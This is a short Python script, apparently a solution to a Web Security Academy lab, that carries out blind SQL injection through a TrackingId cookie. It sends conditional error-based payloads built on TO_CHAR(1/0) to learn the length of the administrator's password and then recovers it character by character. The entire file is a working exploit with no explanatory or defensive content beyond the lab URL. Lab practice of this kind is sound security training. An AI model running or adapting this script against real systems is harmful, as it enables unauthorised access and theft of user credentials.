# Blind SQL injection with conditional responses
import requests
import string

url = "https://abc.web-security-academy.net/"
userName = "administrator"

passwordLengthNotFound = True
passwordLength = 20
while(passwordLengthNotFound):
    lengthRequest = requests.get(url, cookies={"TrackingId":f"x' AND (SELECT CASE WHEN (LENGTH(password)={passwordLength}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = '{userName}')='a"})
    print(f"Checking if password length is {passwordLength}")
    if "Internal Server Error" in lengthRequest.text:
        print(f"Password length is {passwordLength}")
        passwordLengthNotFound = False
        break
    passwordLength+=1

# Combining lowercase letters and numbers into one list
possiblePasswordCharacters = list(string.ascii_lowercase) + [str(i) for i in range(10)]
password = ""
for passwordIndex in range(1, passwordLength+1):
    for passwordCharacter in possiblePasswordCharacters:
        print(f"Checking if password is {password}{passwordCharacter}")
        lengthRequest = requests.get(url, cookies={"TrackingId":f"x' AND (SELECT CASE WHEN (SUBSTR(password, {passwordIndex}, 1)='{passwordCharacter}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = '{userName}')='a"})
        if "Internal Server Error" in lengthRequest.text:
            password += passwordCharacter
            break

print(f"The password to user {userName} is {password}")